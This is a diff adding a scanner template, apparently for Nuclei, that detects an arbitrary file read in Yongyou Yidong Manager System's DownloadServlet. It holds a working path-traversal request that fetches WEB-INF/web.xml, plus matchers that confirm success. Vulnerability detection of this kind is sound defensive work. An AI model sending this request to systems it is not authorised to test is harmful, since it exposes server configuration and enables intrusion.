@@ -1,0 +1,28 @@
+id: yongyou-yidong-manager-downloadservlet-file-read
+
+info:
+  name: Yongyou Yidong Manager System DownloadServlet Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Vulnerability in Yongyou Yidong Manager System's DownloadServlet allows for arbitrary file read, potentially exposing sensitive configuration files or other critical data.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/servlet/~maportal/;/com.yonyou.maportal.bs.padplugin.controller.DownloadServlet?filename=../../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<listener-class>"
+      - type: word
+        part: header
+        words:
+          - "filename=web.xml"
